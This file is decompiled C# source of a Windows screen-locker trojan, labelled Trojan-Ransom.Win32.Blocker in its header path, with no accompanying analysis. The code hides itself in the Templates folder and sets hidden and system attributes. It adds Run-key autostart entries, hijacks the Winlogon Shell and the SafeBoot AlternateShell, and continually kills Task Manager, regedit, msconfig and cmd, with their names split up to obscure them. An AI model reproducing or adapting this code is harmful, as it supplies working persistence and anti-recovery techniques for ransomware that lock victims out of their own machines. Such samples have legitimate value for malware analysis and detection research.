// Decompiled with JetBrains decompiler
// Type: _4.Wink32wuidl
// Assembly: 4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6ABA6FD7-4E77-471B-BC5C-C391C9A6E267
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.jqmt-9ebcd17f7f32bbca2628c7a70473229a5c16d8177c936d1c870d00191bb7328b.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace _4
{
  [DesignerGenerated]
  public class Wink32wuidl : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    private string Monutrerve1;
    private string Monutrerve2;
    private FileInfo Monutrerve3;
    private FileInfo Monutrerve4;
    private string Monutrerve7;
    private string Monutrerve8;
    private string Monutrerve9;
    private string Monutrerve10;
    private string Monutrerve11;
    private string Monutrerve12;
    private string Monutrerve13;

    [DebuggerNonUserCode]
    static Wink32wuidl()
    {
    }

    public Wink32wuidl()
    {
      this.Load += new EventHandler(this.Wink32wuidl_Load);
      Wink32wuidl.__ENCAddToList((object) this);
      this.Monutrerve1 = Application.ExecutablePath;
      this.Monutrerve2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\Wink32wuidl.exe";
      this.Monutrerve3 = new FileInfo(this.Monutrerve1);
      this.Monutrerve4 = new FileInfo(this.Monutrerve2);
      this.Monutrerve7 = "tas";
      this.Monutrerve8 = "mgr";
      this.Monutrerve9 = "reg";
      this.Monutrerve10 = "dit";
      this.Monutrerve11 = "msc";
      this.Monutrerve12 = "fig";
      this.Monutrerve13 = "cmd";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Wink32wuidl.__ENCList)
      {
        if (Wink32wuidl.__ENCList.Count == Wink32wuidl.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Wink32wuidl.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Wink32wuidl.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Wink32wuidl.__ENCList[index1] = Wink32wuidl.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Wink32wuidl.__ENCList.RemoveRange(index1, checked (Wink32wuidl.__ENCList.Count - index1));
          Wink32wuidl.__ENCList.Capacity = Wink32wuidl.__ENCList.Count;
        }
        Wink32wuidl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Black;
      this.ClientSize = new Size(0, 0);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Wink32wuidl);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.ResumeLayout(false);
    }

    internal virtual Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    private void Wink32wuidl_Load(object sender, EventArgs e)
    {
      try
      {
        File.Move(this.Monutrerve1, this.Monutrerve2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.Monutrerve3.Attributes = this.Monutrerve3.Attributes | FileAttributes.Hidden | FileAttributes.System;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.Monutrerve4.Attributes = this.Monutrerve4.Attributes | FileAttributes.Hidden | FileAttributes.System;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(nameof (Wink32wuidl), (object) this.Monutrerve2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(nameof (Wink32wuidl), (object) this.Monutrerve2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true).SetValue("Shell", (object) (this.Monutrerve2 + ",explorer.exe"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true).SetValue("Shell", (object) (this.Monutrerve2 + ",explorer.exe"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", true).SetValue("AlternateShell", (object) (this.Monutrerve2 + ",explorer.exe"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName(this.Monutrerve7 + "k" + this.Monutrerve8);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process[] processesByName = Process.GetProcessesByName(this.Monutrerve9 + nameof (e) + this.Monutrerve10);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process[] processesByName = Process.GetProcessesByName(this.Monutrerve11 + "on" + this.Monutrerve12);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Process[] processesByName = Process.GetProcessesByName(this.Monutrerve13);
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
